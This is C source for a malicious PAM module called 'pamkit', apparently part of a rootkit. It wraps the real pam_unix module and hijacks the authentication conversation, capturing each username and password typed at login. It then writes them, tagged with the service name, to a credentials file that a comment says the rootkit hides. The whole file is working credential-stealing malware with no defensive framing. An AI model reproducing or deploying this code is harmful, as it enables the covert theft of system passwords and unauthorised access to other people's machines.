#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <security/pam_modules.h>
#include <security/pam_appl.h> //conv
#include <security/_pam_types.h>

#define PAM_UNIX_PATH "<DEFINE>"
#define PAMKIT_CREDENTIALS_PATH "<DEFINE>"

#ifdef DEBUG
#define D(x, y) do { \
    fprintf(stderr, "%s: %s\n", x, y); \
    } while (0)
#else
#define D(x,y) do {} while(0)
#endif 

typedef int (*orig_sm_authenticate_t)   (pam_handle_t *, int, int, const char **);
typedef int (*orig_sm_setcred_t)        (pam_handle_t *, int, int, const char **);
typedef int (*orig_sm_acct_mgmt_t)      (pam_handle_t *, int, int, const char **);
typedef int (*orig_sm_chauthtok_t)      (pam_handle_t *, int, int, const char **);
typedef int (*orig_sm_open_session_t)   (pam_handle_t *, int, int, const char **);
typedef int (*orig_sm_close_session_t)  (pam_handle_t *, int, int, const char **);

typedef int (*conversation_t)(int, const struct pam_message **, struct pam_response **, void *);
conversation_t orig_conversation_function;

char *pamkit_username = NULL;
char *pamkit_authtok = NULL;

void *module_handle = NULL;


void __attribute__((constructor))
load_pam_unix(void)
{
    module_handle = dlopen(PAM_UNIX_PATH, RTLD_LAZY);
    if (!module_handle) {
        D("load_pam_unix", dlerror());
        exit(EXIT_FAILURE);
    }

    dlerror();
}

void __attribute__((destructor))
unload_pam_unix(void)
{
    if (module_handle) {
        dlclose(module_handle);
        module_handle = NULL;
    }
}

static void inline
_do_free(void *ptr)
{
    free(ptr);
    ptr = NULL;
}


int
pamkit_mitm_conversation(int num_msg, const struct pam_message **msg, struct pam_response **resp, void *appdata_ptr)
{
    if (orig_conversation_function == NULL) {
        return PAM_CONV_ERR;
    }

    const int retval = orig_conversation_function(num_msg, msg, resp, appdata_ptr);

    if (retval != PAM_SUCCESS) {
        return retval;
    }

    // Inspect conversation msgs and their responses
    for(int i = 0; i < num_msg; i++) {
        
        const struct pam_message *message = *msg + i;
        const struct pam_response  *response = *resp +i;

        if (!message || !resp) {
            continue;
        }

        if (strstr(message->msg, "login")) {
            pamkit_username = strdup(response->resp);
        }

        if (strstr(message->msg, "Password")) {
            pamkit_authtok = strdup(response->resp);
        }
    }
    return PAM_SUCCESS;
}


int
pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    const orig_sm_authenticate_t orig_sm_authenticate = dlsym(module_handle, "pam_sm_authenticate");

    if (!orig_sm_authenticate) {
        D("unable to obtain address of 'pam_sm_authenticate'", dlerror());
        return PAM_ABORT;
    }

    // Retrieve application specified conversation function
    struct pam_conv *target_conv;
    int ret = pam_get_item(pamh, PAM_CONV, (const void **) &target_conv);

    if (ret != PAM_SUCCESS) {
        // If no conversation function is specified, we let the original pam_unix deal with it
        return orig_sm_authenticate(pamh, flags, argc, argv);
    }

    orig_conversation_function = target_conv->conv;
    
    // Replace application specified conv. function with our custom one
    target_conv->conv = (conversation_t) pamkit_mitm_conversation;

    ret = orig_sm_authenticate(pamh, flags, argc, argv);

    // Restore original conversation function
    target_conv->conv = orig_conversation_function;
    orig_conversation_function = NULL;

    if (ret != PAM_SUCCESS) {
        goto out;
    }

    if ((pamkit_authtok == NULL) || (pamkit_authtok[0] == '\0')) {
        // Could not retrieve any authentication token
        goto out;
    }

    // If username was not obtained from the (msg, response) pairs, we check if it was set during the
    //  'pam_start()' invocation
    if (pamkit_username == NULL || (pamkit_username[0] == '\0')) {
        const char *temp;
        const int ret_item = pam_get_item(pamh, PAM_USER, (const void **) &temp);

        if (ret_item == PAM_SUCCESS && temp != NULL) {
            pamkit_username = strdup((char*) temp);
        } else {
            goto out;
        }
    }

    // Note: file is hidden by the rootkit
    FILE *f = fopen(PAMKIT_CREDENTIALS_PATH, "a+");

    if (!f) {
        goto out;
    }

        char *service_name = NULL;
    const int service_ret = pam_get_item(pamh, PAM_SERVICE, (const void **) &service_name);

    if (service_ret != PAM_SUCCESS || service_name == NULL) {
        goto out;
    }

    char *line = NULL;
    if (asprintf(&line, "[%s]: <%s> <%s>\n", service_name, pamkit_username, pamkit_authtok) < 0) {
        goto out;
    }
    
    int fd = fileno(f);
    write(fd, line, strlen(line));
    close(fd);

    _do_free(line);
out:
    _do_free(pamkit_username);
    _do_free(pamkit_authtok);
    return ret;
}

int
pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv)
{    
    const orig_sm_setcred_t orig_sm_setcred = dlsym(module_handle, "pam_sm_setcred");

    if (!orig_sm_setcred) {
        D("unable to obtain address of 'pam_sm_setcred'", dlerror());
        return PAM_ABORT;
    }

    return orig_sm_setcred(pamh, flags, argc, argv);
}

int
pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    const orig_sm_acct_mgmt_t orig_sm_acct_mgmt = dlsym(module_handle, "pam_sm_acct_mgmt");

    if (!orig_sm_acct_mgmt) {
        D("unable to obtain address of 'pam_sm_acct_mgmt'", dlerror());
        return PAM_ABORT;
    }

    return orig_sm_acct_mgmt(pamh, flags, argc, argv);
}

int
pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    const orig_sm_chauthtok_t orig_sm_chauthtok = dlsym(module_handle, "pam_sm_chauthtok");

    if (!orig_sm_chauthtok) {
        D("unable to obtain address of 'pam_sm_chauthok'", dlerror());
        return PAM_ABORT;
    }

    return orig_sm_chauthtok(pamh, flags, argc, argv);
}

int
pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    const orig_sm_open_session_t orig_sm_open_session = dlsym(module_handle, "pam_sm_open_session");

    if (!orig_sm_open_session) {
        D("unable to obtain address of 'pam_sm_open_session'", dlerror());
        return PAM_ABORT;
    }

    return orig_sm_open_session(pamh, flags, argc, argv);
}

int
pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    const orig_sm_close_session_t orig_sm_close_session = dlsym(module_handle, "pam_sm_close_session");

    if (!orig_sm_close_session) {
        D("unable to obtain address of 'pam_sm_close_session'", dlerror());
        return PAM_ABORT;
    }

    return orig_sm_close_session(pamh, flags, argc, argv);
}
